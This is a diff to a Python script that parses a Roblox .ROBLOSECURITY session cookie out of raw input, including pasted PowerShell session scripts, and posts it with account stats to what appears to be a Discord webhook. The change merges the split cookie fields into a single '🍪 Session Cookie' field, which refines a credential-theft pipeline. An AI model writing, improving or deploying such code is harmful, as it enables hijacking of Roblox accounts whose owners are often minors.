@@ -12,7 +12,6 @@ def extract_and_clean_cookie(raw_input):
     raw_str = str(raw_input).strip()
     print(f"DEBUG: Step 1 (Received) -> Length: {len(raw_str)}, Start: {raw_str[:12]}...", file=sys.stderr)
 
-    # Detects PowerShell session script blocks and extracts only the short .ROBLOSECURITY value
     ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
     if ps_match:
         cookie = ps_match.group(1)
@@ -25,10 +24,6 @@ def extract_and_clean_cookie(raw_input):
 
     if cookie.startswith(".ROBLOSECURITY="):
         cookie = cookie[len(".ROBLOSECURITY="):].strip()
-
-    warning_match = re.search(r'(_\\?\|WARNING:[^"\']+)', cookie)
-    if warning_match:
-        cookie = warning_match.group(1)
 
     clean_cookie = cookie.rstrip(';').strip()
     print(f"DEBUG: Final processed cookie -> Length: {len(clean_cookie)}, Start: {clean_cookie[:12]}...", file=sys.stderr)
@@ -225,10 +220,8 @@ def main():
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
         
-        # Split cookie securely to avoid Discord's 1024 character field limit
-        mid = len(roblosecurity) // 2
-        cookie_part_1 = f"```text\n{roblosecurity[:mid]}\n```"
-        cookie_part_2 = f"```text\n{roblosecurity[mid:]}\n```"
+        # Format the clean cookie directly as a single block
+        cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
             "username": f"{display_name} | Stats",
@@ -281,13 +274,8 @@ def main():
                             "inline": True
                         },
                         {
-                            "name": "Cookie (Part 1)",
-                            "value": cookie_part_1,
-                            "inline": False
-                        },
-                        {
-                            "name": "Cookie (Part 2)",
-                            "value": cookie_part_2,
+                            "name": "🍪 Session Cookie",
+                            "value": cookie_display,
                             "inline": False
                         }
                     ],
@@ -317,8 +305,8 @@ def main():
             sys.exit(1)
 
     except Exception as e:
-        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
-        sys.exit(1)
+            print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
+            sys.exit(1)
 
 if __name__ == "__main__":
     main()
